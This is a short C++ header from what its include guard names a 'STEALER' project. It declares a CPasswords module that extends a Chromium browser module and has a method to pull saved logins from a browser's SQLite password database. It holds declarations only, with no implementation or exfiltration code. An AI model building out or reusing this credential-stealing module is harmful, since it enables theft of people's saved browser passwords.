//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CPASSWORDS_H
#define STEALER_CPASSWORDS_H


#include "../ChromiumBrowserModule.h"
#include "sqlite3.h"

class CPasswords : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
private:
    std::list<Login> getPasswords(const fs::path& db_path);
};


#endif //STEALER_CPASSWORDS_H
